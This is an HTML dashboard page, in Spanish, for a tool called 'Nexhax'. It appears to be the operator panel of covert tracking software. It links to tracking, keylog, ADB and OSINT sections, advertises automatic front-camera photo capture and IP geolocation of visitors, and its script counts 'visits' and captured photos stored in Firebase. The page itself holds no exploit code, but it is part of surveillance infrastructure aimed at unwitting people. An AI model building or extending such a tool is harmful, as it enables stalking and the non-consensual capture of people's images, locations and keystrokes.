<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Active Server - Sistema de rastreo profesional">
    <meta name="theme-color" content="#000000">
    <meta name="color-scheme" content="light dark">
    <title>Nexhax - Dashboard</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>

<body>
    <header class="topbar">
        <div class="brand">Nexhax</div>
        <button class="btn btn-outline-secondary d-md-none" type="button" data-bs-toggle="offcanvas"
            data-bs-target="#mobileNav" aria-controls="mobileNav">
            Menu
        </button>
        <nav class="nav-links">
            <a href="home.html" class="active">Dashboard</a>
            <a href="rastreo.html">Rastreo</a>
            <a href="keylogs.html">Keylogs</a>
            <a href="perfil.html">Perfil</a>
            <a href="adb.html">ADB</a>
            <a href="osint.html">OSINT</a>
        </nav>
        <button class="btn-ghost btn-inline" id="btn-out">Cerrar sesion</button>
    </header>

    <div class="offcanvas offcanvas-start d-md-none" tabindex="-1" id="mobileNav" aria-labelledby="mobileNavLabel">
        <div class="offcanvas-header">
            <h5 class="offcanvas-title" id="mobileNavLabel">Navegacion</h5>
            <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Cerrar"></button>
        </div>
        <div class="offcanvas-body">
            <div class="list-group">
                <a href="home.html" class="list-group-item list-group-item-action active">Dashboard</a>
                <a href="rastreo.html" class="list-group-item list-group-item-action">Rastreo</a>
                <a href="keylogs.html" class="list-group-item list-group-item-action">Keylogs</a>
                <a href="perfil.html" class="list-group-item list-group-item-action">Perfil</a>
                <a href="adb.html" class="list-group-item list-group-item-action">ADB</a>
                <a href="osint.html" class="list-group-item list-group-item-action">OSINT</a>
            </div>
        </div>
    </div>
    <div class="card">
        <h1>Exhax</h1>
        <div id="user-info">
            <span class="loading"></span> Cargando...
        </div>

        <div class="stats-grid stagger">
            <div class="stat-card">
                <div class="stat-number" id="total-visits">0</div>
                <div class="stat-label">Total Visitas</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="total-photos">0</div>
                <div class="stat-label">Fotos Capturadas</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="today-visits">0</div>
                <div class="stat-label">Visitas Hoy</div>
            </div>
        </div>

        <h3 style="margin-top: 32px; margin-bottom: 16px;">Características Implementadas</h3>
        <ul class="feature-list stagger">
            <li>Rastreo de visitas con captura de IP y geolocalización</li>
            <li>Captura automática de fotos mediante cámara frontal</li>
            <li>Almacenamiento temporal de fotos (1 hora)</li>
            <li>Dashboard en tiempo real con estadísticas</li>
            <li>Limpieza automática de datos expirados</li>
            <li>Interfaz profesional y responsive</li>
        </ul>

    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script type="module">
        import { auth, signOut, db, ref, onValue, set, onDisconnect } from './firebase-config.js';
        import { ensureSingleSession } from './session-guard.js';

        const userInfo = document.getElementById('user-info');
        const btnOut = document.getElementById('btn-out');
        const totalVisitsEl = document.getElementById('total-visits');
        const totalPhotosEl = document.getElementById('total-photos');
        const todayVisitsEl = document.getElementById('today-visits');

        auth.onAuthStateChanged(u => {
            if (!u) {
                location.href = 'index.html';
                return;
            }

            ensureSingleSession({ auth, db, ref, set, onValue, onDisconnect, signOut, user: u });

            userInfo.textContent = u.email;

            const visitasRef = ref(db, `visitas/${u.uid}`);
            onValue(visitasRef, (snap) => {
                if (!snap.exists()) {
                    totalVisitsEl.textContent = '0';
                    totalPhotosEl.textContent = '0';
                    todayVisitsEl.textContent = '0';
                    return;
                }

                let totalVisits = 0;
                let totalPhotos = 0;
                let todayVisits = 0;
                const today = new Date().toLocaleDateString('es-ES');

                snap.forEach(child => {
                    const visit = child.val();
                    totalVisits++;

                    if (visit.foto) {
                        totalPhotos++;
                    }

                    if (visit.fecha && visit.fecha.includes(today.split('/').reverse().join('/'))) {
                        todayVisits++;
                    }
                });

                totalVisitsEl.textContent = totalVisits;
                totalPhotosEl.textContent = totalPhotos;
                todayVisitsEl.textContent = todayVisits;
            });
        });

        btnOut.onclick = async () => {
            if (confirm('¿Cerrar sesión?')) {
                await signOut(auth);
                location.href = 'index.html';
            }
        };
    </script>
</body>

</html>
